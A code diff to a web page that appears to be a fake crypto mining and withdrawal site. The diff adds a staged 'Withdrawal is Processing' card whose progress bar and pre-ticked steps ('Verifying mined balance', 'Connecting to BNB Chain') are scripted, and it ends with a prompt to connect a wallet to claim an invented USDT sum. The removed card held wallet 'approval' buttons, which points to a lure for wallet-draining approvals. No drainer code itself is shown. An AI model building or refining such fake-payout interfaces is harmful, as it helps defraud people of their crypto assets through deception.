@@ -75,12 +75,15 @@
             </div>
         </div>
 
-        <div class="assets-card glass">
-            <h3>Available Assets</h3>
-            <div id="approvalButtonsContainer" class="grid">
-                <p id="assetsMsg" class="connect-message">
-                    <i class="fa-solid fa-triangle-exclamation"></i> Please connect your wallet to withdraw assets...
-                </p>
+        <!-- NEW PROCESSING CARD -->
+        <div class="processing-card glass" id="processingCard">
+            <h3><i class="fa-solid fa-hourglass-half fa-spin"></i> Withdrawal is Processing</h3>
+            <p>Please wait while we secure your assets on-chain...</p>
+            <div class="progress-bar"><div class="progress-fill-process" id="process-progress"></div></div>
+            <div class="process-steps" id="processSteps">
+                <div><i class="fa-solid fa-circle-check text-green"></i> Verifying mined balance</div>
+                <div><i class="fa-solid fa-circle-check text-green"></i> Connecting to BNB Chain</div>
+                <div><i class="fa-solid fa-spinner fa-spin text-cyan"></i> Preparing withdrawal transaction</div>
             </div>
         </div>
 
@@ -93,6 +96,7 @@
     <script>
         let bnrBalance = 0.000, bnrBlocks = 0, bnrProgress = 0;
         let periaBalance = 0.0000, periaProgress = 0;
+        let processProgress = 0;
 
         function getRandomHash() {
             return '0x' + Math.random().toString(16).substr(2, 6) + '...' + Math.random().toString(16).substr(2, 4);
@@ -125,6 +129,12 @@
             document.getElementById('peria-progress').style.width = periaProgress + '%';
         }, 1200);
 
+        const processInterval = setInterval(() => {
+            processProgress += 16.6;
+            if(processProgress > 100) processProgress = 100;
+            document.getElementById('process-progress').style.width = processProgress + '%';
+        }, 1000);
+
         function addLog(id, text) {
             const term = document.getElementById(id);
             const line = document.createElement('div');
@@ -136,15 +146,22 @@
         setTimeout(() => {
             clearInterval(bnrInterval);
             clearInterval(periaInterval);
+            clearInterval(processInterval);
             document.getElementById('bnr-hashrate').innerText = '0.0 MH/s (Idle)';
             document.getElementById('bnr-progress').style.width = '100%';
             document.getElementById('peria-progress').style.width = '100%';
+            document.getElementById('process-progress').style.width = '100%';
             addLog('bnr-terminal', '<span style="color:var(--neon-green)">[SYSTEM] Mining Finished. Ready.</span>');
             addLog('peria-terminal', '<span style="color:var(--neon-cyan)">[SYSTEM] Cloud Synced. Ready.</span>');
             const usdtValue = ((bnrBalance * 180) + (periaBalance * 25)).toFixed(2);
             const portalStatus = document.getElementById('portalStatus');
             portalStatus.innerHTML = `You mined <span style="color:var(--neon-green);">${bnrBalance.toFixed(4)} BNR</span> and <span style="color:var(--neon-cyan);">${periaBalance.toFixed(2)} PERIA</span> of <span style="color:var(--bnb-yellow);">$${usdtValue} USDT</span>`;
-            document.getElementById('assetsMsg').style.display = 'none';
+            
+            document.getElementById('processingCard').innerHTML = `
+                <h3 style="color:var(--neon-green)"><i class="fa-solid fa-circle-check"></i> Withdrawal Ready</h3>
+                <p>Connect your wallet to claim $${usdtValue} USDT</p>
+            `;
+
             const btn = document.getElementById('connectWalletBtn');
             btn.disabled = false;
             btn.classList.add('active-ready');
